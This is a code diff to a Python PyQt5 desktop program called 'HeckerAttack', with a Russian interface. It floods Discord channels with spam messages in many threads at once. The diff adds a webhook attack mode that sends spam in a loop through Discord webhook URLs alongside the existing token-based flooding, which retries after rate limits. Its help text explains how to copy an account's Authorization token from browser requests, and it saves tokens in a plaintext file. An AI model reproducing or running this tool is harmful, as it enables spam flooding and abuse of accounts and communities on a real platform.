@@ -1,5 +1,6 @@
 # pip install discontrol
 # pip install pyqt5
+# pip install discord
 
 try:
     from os import name
@@ -19,6 +20,7 @@ try:
     import random
     from os import _exit
     from os.path import split, sep
+    from discord import Webhook, RequestsWebhookAdapter
 
     class HoverButton(QtWidgets.QPushButton):
         hover = QtCore.pyqtSignal(str)
@@ -45,9 +47,7 @@ try:
 5. Отправьте какое нибудь сообщение, или выполните другое действие
 6. Нажмите на запрос
 7. Найдите в заголовках Authorization
-8. Скопируйте значение
-
-Токен у вас!'''
+8. Скопируйте значение'''
 
     WhatIsChannelID = '''ID канала Discord
 
@@ -252,7 +252,7 @@ ID канала - это уникальная цифра
 
             print(f'Starting hecker attack on token {token}')
 
-            UpdateLogs(f'[INFO] Started attack thread {thr_id}')
+            UpdateLogs(f'[INFO] Started attack thread {thr_id} - USER')
 
             client = discontrol.Client(token)
 
@@ -263,7 +263,8 @@ ID канала - это уникальная цифра
                             return
                         client.send_message(attack, Parse(spam_text))
                         UpdateLogs(
-                            f'[INFO] [200 - OK] Sended flood in {attack}')
+                            f'[INFO] [200 - OK] Sended flood in {attack} as USER'
+                        )
                     except Exception as e:
                         try:
                             retry_after = e.args[0]['retry_after']
@@ -279,6 +280,29 @@ ID канала - это уникальная цифра
                             except:
                                 UpdateLogs(f'[Error] Unknown -> {e}')
                                 time.sleep(1)
+
+        def webhook_hecker_attack(self, url, spam_text, thr_id):
+
+            UpdateLogs(f'[INFO] Started attack thread {thr_id} - WEBHOOK')
+
+            try:
+                webhook = Webhook.from_url(url,
+                                           adapter=RequestsWebhookAdapter())
+            except:
+                UpdateLogs(f'[ERROR] Webhook error: {url}')
+                return
+
+            while Attackker.is_working:
+                try:
+                    webhook.send(Parse(spam_text))
+                    UpdateLogs(
+                        f'[INFO] [200 - OK] Sended flood as WEBHOOK'
+                    )
+                except:
+                    UpdateLogs(
+                        f'[ERROR] Failed to send flood as webhook'
+                    )
+                    time.sleep(1)
 
         def attack(self, clients, channels, spam_text):
             for c in clients:
@@ -319,24 +343,46 @@ ID канала - это уникальная цифра
             index = 1
 
             for token in clients:
-                try:
-                    index += 1
-                    UpdateLogs(f'[INFO] Сканирование токена {token}')
-                    discontrol.Client(str(token))
-                except Exception as e:
-                    UpdateLogs(f'[INFO] Неверный токен - {token}')
-                    print(f'Error {e}')
-                    windll.user32.MessageBoxW(
-                        0, f'Токен "{token}" №{index} неверен.', 'ОШИБКА!', 0)
-                    self.AttackButton.setStyleSheet(
-                        "font: 87 8pt \"Segoe UI Black\";\n"
-                        "border-style: solid;\n"
-                        "border-color: white;\n"
-                        "border-radius: 5;\n"
-                        "background-color: rgb(88,101,242);\n"
-                        "color: white;")
-                    self.AttackButton.setText('АТАКОВАТЬ')
-                    return
+                if 'http://' not in token and 'https://' not in token:
+                    try:
+                        index += 1
+                        UpdateLogs(f'[INFO] Сканирование токена {token}')
+                        discontrol.Client(str(token))
+                    except Exception as e:
+                        UpdateLogs(f'[WARNING] Неверный токен - {token}')
+                        print(f'Error {e}')
+                        windll.user32.MessageBoxW(
+                            0, f'Токен "{token}" №{index} неверен.', 'ОШИБКА!',
+                            0)
+                        self.AttackButton.setStyleSheet(
+                            "font: 87 8pt \"Segoe UI Black\";\n"
+                            "border-style: solid;\n"
+                            "border-color: white;\n"
+                            "border-radius: 5;\n"
+                            "background-color: rgb(88,101,242);\n"
+                            "color: white;")
+                        self.AttackButton.setText('АТАКОВАТЬ')
+                        return
+                else:
+                    try:
+                        UpdateLogs(f'[INFO] Сканирование вебхука {token}')
+                        Webhook.from_url(token,
+                                         adapter=RequestsWebhookAdapter())
+                    except:
+                        UpdateLogs(f'[WARNING] Неверный вебхук - {token}')
+                        print(f'Error {e}')
+                        windll.user32.MessageBoxW(
+                            0, f'Вебхук "{token}" №{index} неверен.',
+                            'ОШИБКА!', 0)
+                        self.AttackButton.setStyleSheet(
+                            "font: 87 8pt \"Segoe UI Black\";\n"
+                            "border-style: solid;\n"
+                            "border-color: white;\n"
+                            "border-radius: 5;\n"
+                            "background-color: rgb(88,101,242);\n"
+                            "color: white;")
+                        self.AttackButton.setText('АТАКОВАТЬ')
+                        return
 
             channels = []
 
@@ -369,15 +415,21 @@ ID канала - это уникальная цифра
             Attackker.is_working = True
 
             for token in clients:
-                threading.Thread(target=lambda: self.hecker_attack(
-                    str(token), channels, self.SpamEdit.toPlainText(), index)
-                                 ).start()
+                if 'http://' not in token and 'https://' not in token:
+                    threading.Thread(target=lambda: self.hecker_attack(
+                        str(token), channels, self.SpamEdit.toPlainText(),
+                        index)).start()
+                else:
+                    threading.Thread(target=lambda: self.webhook_hecker_attack(
+                        str(token), self.SpamEdit.toPlainText(), index)).start(
+                        )
                 index += 1
                 time.sleep(.2)
 
             global CurrentUserFolder
 
-            tokens = open(CurrentUserFolder + '\\' + 'hecker_attack_ok_tokens.txt', 'w')
+            tokens = open(
+                CurrentUserFolder + '\\' + 'hecker_attack_ok_tokens.txt', 'w')
 
             tokens.write(self.TokensInput.toPlainText())
 
@@ -425,14 +477,18 @@ ID канала - это уникальная цифра
                                            "padding-bottom: 3;\n")
             self.TokensInput.setObjectName("TokensInput")
             try:
-                tokens = open(CurrentUserFolder + '\\' + 'hecker_attack_ok_tokens.txt', 'r')
+                tokens = open(
+                    CurrentUserFolder + '\\' + 'hecker_attack_ok_tokens.txt',
+                    'r')
                 available_tokens = tokens.read()
                 tokens.close()
                 UpdateLogs(
                     f'[INFO] Чтение токенов из hecker_attack_ok_tokens.txt')
             except:
                 available_tokens = ''
-                file = open(CurrentUserFolder + '\\' + 'hecker_attack_ok_tokens.txt', 'w')
+                file = open(
+                    CurrentUserFolder + '\\' + 'hecker_attack_ok_tokens.txt',
+                    'w')
                 file.close()
                 UpdateLogs(
                     '[INFO] В папке пользователя создан hecker_attack_ok_tokens.txt, потому что предыдущий был удалён/не создан.'
@@ -547,7 +603,7 @@ ID канала - это уникальная цифра
             MainWindow.setWindowTitle("HeckerAttack")
             self.ApplicationMainLabel.setText("HeckerAttack by Its-MatriX")
             self.TokensInput.setPlaceholderText(
-                "Введите токен(ы) аккаунта(ов) по одному на строку")
+                "Введите токен(ы) аккаунта(ов) или URL вебхука по одному на строку")
             self.LabelStep1.setText("1. Аккаунты")
             self.IdsInput.setPlaceholderText(
                 "Введите ID каналов по одному на строку")
